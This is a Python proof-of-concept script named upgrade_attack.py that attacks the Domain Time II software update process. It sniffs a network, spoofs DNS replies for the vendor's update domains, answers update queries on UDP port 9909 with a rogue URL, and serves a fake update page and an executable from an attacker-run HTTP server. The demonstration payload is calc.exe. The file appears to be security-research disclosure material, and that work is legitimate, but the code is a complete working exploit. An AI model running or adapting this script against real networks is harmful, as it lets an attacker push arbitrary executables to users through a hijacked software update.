#!/usr/bin/env python

from multiprocessing import Process
from time import sleep
import argparse
import http.server
import re
import socketserver
import socket

from scapy.all import *


def build_dns_response(query, name):
    ip = query[IP]
    udp = query[UDP]
    dns = query[DNS]

    dns_answer = DNSRR(rrname=name, type='A', rclass='IN', ttl=5, rdata=server_ip)

    response = IP(src=ip.dst, dst=ip.src)
    response /= UDP(sport=udp.dport, dport=udp.sport)
    response /= DNS(id=dns.id, qr=1, aa=0, qdcount=1, ancount=1, qd=dns.qd, an=dns_answer)

    return response


def parse_dns_query(pkt):
    if DNSRR in pkt:
        name = pkt[DNSRR].rrname.decode('UTF-8', errors='backslashreplace')
        print(f'DNS Response for "{name}" from {pkt[IP].src}')

    elif DNSQR in pkt:
        name = pkt[DNSQR].qname.decode('UTF-8', errors='backslashreplace')
        print(f'DNS Query for "{name}" from {pkt[IP].src}')
        for update_domain in update_domains:
            if name.startswith(update_domain):
                dns_response = build_dns_response(pkt, name)
                send(dns_response, iface=sniff_iface)
                print(f'[+] Target DNS Query responded to with {server_ip}')


def parse_dt2_pkt(pkt):
    ip = pkt[IP]
    udp = pkt[UDP]
    print(f'DT2 from {ip.src}:{udp.sport} to {ip.dst}:{udp.dport}')

    if ip.dst == server_ip:
        update_regex = b'[1-5]\\.[0-9]\\..\\.[0-9]*\x00'
        if re.search(update_regex, udp.payload.load):
            dt2 = udp.payload
            update_response = IP(src=ip.dst, dst=ip.src)
            update_response /= UDP(sport=udp.dport, dport=udp.sport)
            update_response /= update_url.encode('utf-8') + b"\x00"
            send(update_response, iface=sniff_iface)
            print(f'[+] Responded to target DT2 Update request: {dt2.load}')


def udp_callback(pkt):
    if IP not in pkt or UDP not in pkt:
        return
    udp = pkt[UDP]
    try:
        if udp.dport == 53 or udp.sport == 53:
            parse_dns_query(pkt)
        if udp.dport == 9909 or udp.sport == 9909:
            parse_dt2_pkt(pkt)
    except Exception as e:
        print(f'[!] Packet caused exception: {str(e)}')
        print(f'    {pkt.summary()}')


class CustomHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # strip extra params for pattern matching
        if '?' in self.path:
            path = self.path[:self.path.find('?')]
        else:
            path = self.path
        if path.endswith('.exe'):
            # serve a demonstration payload
            self.path = 'files/calc.exe'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        elif path.endswith('.asp'):
            # serve our copy of their update page
            #self.path = 'files/registered.asp.html'
            self.path = 'files/evaluation.asp.html'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        else:
            # Redirect to non-www greyware domain so they serve the content
            self.send_response(302)
            self.send_header('Location', f'http://greyware.com/{self.path}')
            self.end_headers()
            return


def serve_http_thread(server_ip, http_port):
    http_address = (server_ip, http_port)
    custom_http_server = socketserver.TCPServer(http_address, CustomHttpRequestHandler)

    print(f'Serving HTTP at {server_ip} on port {http_port}...')
    try:
        while True:
            custom_http_server.handle_request()
    except KeyboardInterrupt:
        pass
    print('HTTP server stopped.')


def recv_udp(server_ip):
    """Keep 9909:UDP open but do nothing; response happens in sniffer."""
    udp_address = (server_ip, 9909)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(udp_address)
    print(f'Ready for DT2 traffic at {server_ip}')
    try:
        while True:
            _ = s.recv(0x1000)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser('upgrade_attack.py', description='Proof of concept MotS on DT2 upgrade')
    parser.add_argument('interface', help='Interface to sniff/send on')
    parser.add_argument('ip_address', help='IP to serve fake update on')
    parser.add_argument('-i', '--http_impersonation', help='Run the HTTP impersonation PoC', 
                        default=False, action='store_true')
    parser.add_argument('-p', '--port', help='Port to serve fake update on',
                        type=int, default=80)

    args = parser.parse_args()
    sniff_iface = args.interface
    server_ip = args.ip_address
    http_port = args.port
    if http_port == 80:
        port_string = ''
    else:
        port_string = f':{http_port}'

    # Legitimate update link example:
    # 'https://www.greyware.com/software/domaintime/update/evaluation.asp'
    if args.http_impersonation:
        # This points to their URL (HTTP), which assumes we can win DNS and HTTP races
        update_url = 'http://www.greyware.com/software/domaintime/update/evaluation.asp'
        #update_url = 'http://www.greyware.com/software/domaintime/update/registered.asp'
    else:
        # This points to a URL on our server, not theirs
        update_url = f'http://{server_ip}{port_string}/software/domaintime/update/evaluation.asp'
        #update_url = f'http://{server_ip}{port_string}/software/domaintime/update/registered.asp'
    
    # The typical update domains (DT2 update domain and web domain)
    update_domains = ['update.greyware.com', 'www.greyware.com']

    http_child = Process(target=serve_http_thread, args=(server_ip, http_port))
    http_child.start()
    # Let the HTTP server start up first
    sleep(1)
    if not http_child.is_alive():
        print('Error: HTTP server failed to start correctly, quitting...')
        exit(-1)

    # listen on 9909:UDP so we don't respond that the port is closed
    udp_child = Process(target=recv_udp, args=(server_ip,))
    udp_child.start()
    sleep(0.1)
    if not udp_child.is_alive():
        print('Warning: failed to listen on port 9909:UDP; may not respond correctly')

    # Removes extra scapy logging on send()
    conf.verb = False
    print(f'Sniffing for upgrade traffic on interface {sniff_iface}, Press CTRL+C to stop...')
    try:
        sniff(iface=sniff_iface, prn=udp_callback, filter="udp", store=False)
    except Scapy_Exception as e:
        print(f'Scapy Exception occurred: {str(e)}')
        print(f'Error: Sniffing failed, check you\'re on the right interface and run with sudo.')

    http_child.terminate()
    http_child.join()
    udp_child.terminate()
    udp_child.join()

    print('Done.')

